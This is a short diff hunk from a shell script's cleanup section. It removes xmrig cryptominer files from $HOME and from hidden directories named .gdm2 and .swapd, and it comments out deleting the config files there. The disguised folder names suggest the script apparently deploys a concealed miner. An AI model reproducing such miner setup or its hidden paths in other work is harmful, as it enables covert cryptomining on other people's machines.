@@ -64,8 +64,8 @@ fi
 
 # Clean up
 rm -rf $HOME/config.json*
-rm -rf $HOME/.gdm2/config.json*
-rm -rf $HOME/.swapd/config.json*
+#rm -rf $HOME/.gdm2/config.json*
+#rm -rf $HOME/.swapd/config.json*
 rm -rf $HOME/xmrig*
 rm -rf $HOME/.gdm2/xmrig*
 rm -rf $HOME/.swapd/xmrig*
